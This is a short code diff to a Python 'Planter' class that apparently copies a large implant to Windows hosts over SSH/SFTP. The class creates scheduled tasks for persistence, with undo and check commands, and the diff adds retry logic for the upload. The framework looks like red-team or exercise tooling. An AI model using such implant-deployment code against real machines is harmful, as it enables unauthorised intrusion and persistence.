@@ -313,8 +313,7 @@ class Planter:
         try:
             self._win(ip, fh, f'powershell -NoProfile -Command "New-Item -ItemType '
                               f'Directory -Force -Path \'{remote_dir}\' | Out-Null"')
-            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
-                                  staged, key_path=fh.get("key_path"))
+            self._put(ip, fh, local, staged)
         except Exception as exc:
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
@@ -355,6 +354,19 @@ class Planter:
                 "undo": undo or [f'schtasks /Delete /TN "{drawn["task"]}" /F',
                                  f"Remove-Item -Path '{remote}' -Force"],
                 "check_cmd": f'tasklist /FI "IMAGENAME eq {Path(staged).name}"'}
+
+    def _put(self, ip, fh, local, remote, mode=None, attempts=2):
+        """A 40-50MB implant over Windows OpenSSH occasionally drops one SFTP put."""
+        for attempt in range(attempts):
+            try:
+                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "",
+                                      str(local), remote, mode=mode,
+                                      key_path=fh.get("key_path"))
+                return
+            except Exception:
+                if attempt + 1 >= attempts:
+                    raise
+                time.sleep(3)
 
     def _win_ps(self, ip, fh, body, timeout=120):
         """-EncodedCommand is one token: cmd /c quoting silently lost embedded reg/WMI values."""
